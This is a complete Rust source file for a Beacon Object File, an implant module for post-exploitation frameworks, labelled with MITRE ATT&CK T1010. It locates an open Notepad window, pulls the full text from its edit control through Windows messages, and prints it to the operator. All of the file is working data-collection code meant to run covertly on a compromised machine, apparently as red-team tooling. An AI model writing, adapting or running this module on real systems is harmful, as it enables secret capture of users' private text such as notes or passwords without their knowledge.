//! # Notepad BOF
//!
//! Finds an open Notepad window and reads text from its edit control.
//!
//! ## MITRE ATT&CK
//! - T1010 - Application Window Discovery
//!
//! ## Arguments
//! None.

#![no_std]

use alloc::vec;
use rustbof::{eprintln, println};
use windows_sys::Win32::Foundation::HWND;
use windows_sys::Win32::UI::WindowsAndMessaging::*;

#[rustbof::main]
fn main() {
    let notepad_class = b"Notepad\0";
    let notepad_hwnd: HWND = unsafe {
        FindWindowA(notepad_class.as_ptr(), core::ptr::null())
    };
    if notepad_hwnd.is_null() {
        eprintln!("Notepad window not found");
        return;
    }
    println!("Found Notepad window");

    let edit_class = b"Edit\0";
    let mut edit_hwnd: HWND = unsafe {
        FindWindowExA(notepad_hwnd, core::ptr::null_mut(), edit_class.as_ptr(), core::ptr::null())
    };
    if edit_hwnd.is_null() {
        let rich_class = b"RichEditD2DPT\0";
        edit_hwnd = unsafe {
            FindWindowExA(notepad_hwnd, core::ptr::null_mut(), rich_class.as_ptr(), core::ptr::null())
        };
    }
    if edit_hwnd.is_null() {
        eprintln!("Edit control not found in Notepad");
        return;
    }

    unsafe {
        let text_len = SendMessageA(edit_hwnd, WM_GETTEXTLENGTH, 0, 0) as usize;
        if text_len == 0 {
            println!("Notepad is empty");
            return;
        }

        let buf_size = text_len + 1;
        let mut buffer = vec![0u8; buf_size];
        SendMessageA(edit_hwnd, WM_GETTEXT, buf_size, buffer.as_mut_ptr() as isize);

        let text = core::str::from_utf8(&buffer[..text_len]).unwrap_or("<non-utf8>");
        println!("Notepad content ({} chars):\n{}", text_len, text);
    }
}
